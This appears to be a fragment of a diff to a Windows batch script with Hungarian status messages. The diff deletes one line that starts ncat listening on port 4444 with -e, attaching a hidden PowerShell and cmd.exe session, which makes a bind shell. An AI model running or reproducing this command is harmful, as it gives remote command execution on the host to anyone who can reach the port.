@@ -60,7 +60,5 @@ powershell.exe -Command "
 echo.
 echo [INFO] A munkamenet befejezodott vagy megszakadt.
 
-"%NCAT%" -l -p 4444 -e "powershell.exe -w hidden C:\Windows\System32\cmd.exe"
-
 echo.
 pause
